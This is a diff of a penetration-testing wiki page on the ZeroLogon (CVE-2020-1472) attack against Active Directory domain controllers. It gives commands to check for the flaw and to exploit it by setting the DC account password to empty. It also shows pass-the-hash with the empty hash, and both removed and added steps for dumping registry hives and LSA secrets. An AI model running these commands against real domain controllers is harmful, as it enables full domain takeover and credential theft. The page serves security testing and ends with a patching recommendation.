@@ -24,51 +24,35 @@ permalink: /ad/zerologon/
 
 Everything is explained [here](https://www.secura.com/blog/zero-logon).
 
+Long story short, this attack consists in sending authentication requests to the domain controller as itself - i.e. `DC_NAME$` - with an empty password until it accepts one of them. Once you are authenticated, the exploit sets the password of the domain controller account as empty.
+
 ## Prerequisites
 
 - Network access to the domain controller.
 
 ## Exploit
 
-To check if a domain controller is vulnerable to Zerologon, you can use either `CrackMapExec` or the [SecuraBV GitHub repository](https://github.com/SecuraBV/CVE-2020-1472).
+To check if a domain controller is vulnerable to ZeroLogon, you can use either [NetExec](https://github.com/Pennyw0rth/NetExec) or the [SecuraBV GitHub repository](https://github.com/SecuraBV/CVE-2020-1472).
 
 ```bash
 # You don't need to be authenticated on the domain.
-cme smb $DC_IP -M zerologon
+nxc smb $dc_ip -M zerologon
 ```
 
-If the domain controllers appears to be vulnerable, you can attempt the exploit with this [GitHub repository](https://github.com/risksense/zerologon).
+If the domain controller appears to be vulnerable, you can attempt the exploit with this [dirkjanm's GitHub repository](https://github.com/dirkjanm/CVE-2020-1472).
 
 ```bash
-python3 set_empty_pw.py $DC_NAME $DC_IP
+python3 cve-202-1472-exploit.py $dc_hostname $dc_ip
 ```
 
-This will set the **domain controller's account password as empty**. So you are now able to use `impacket` scripts doing Pass-the-Hash with the following one `:31d6cfe0d16ae931b73c59d7e0c089c0` which corresponds to an empty password.
+This will set the **domain controller's account password as empty**. So you are now able to use `impacket` scripts doing Pass-the-Hash with the following one `:31d6cfe0d16ae931b73c59d7e0c089c0` which corresponds to an empty password, or by using `-no-pass` option. The best option at this point is to perform [DCSync](/ad/dcsync/) attack.
 
-Then to reset the previous password, follow these instructions.
+As explained in [dirkjanm's GitHub repository](https://github.com/dirkjanm/CVE-2020-1472), if you have a recent version of `impacket-secretsdump`, you should be able extract the `hex_plain_text` version of domain controller's previous password. If not, you can still retrieve it by [dumping LSASS cached credentials](/windows/credentials/#lsass-credentials). Once you have it, **don't forget** to put the previous password back.
 
 ```bash
-# Connect to the DC with impacket-wmiexec.
-impacket-wmiexec $DOMAIN/$USERNAME:$PASSWORD@$DC_IP
-
-# Type following commands.
-reg save HKLM\SYSTEM system.save
-reg save HKLM\SAM sam.save
-reg save HKLM\SECURITY security.save
-get system.save
-get sam.save
-get security.save
-del /f system.save
-del /f sam.save
-del /f security.save
-
-# Using previous files, you can recover the original NT.
-impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
-
-# Finally, restore the original NT on the DC.
-python3 reinstall_original_pw.py $DC_NAME $DC_IP $ORIGAL_NT_HASH
+nxc smb $dc_ip -u $domain_admin_user -H $hash -M --lsa
 ```
 
 ## Recommendations
 
-TBD
+- [ ] Apply latest Microsoft security patches on vulnerable domain controllers.
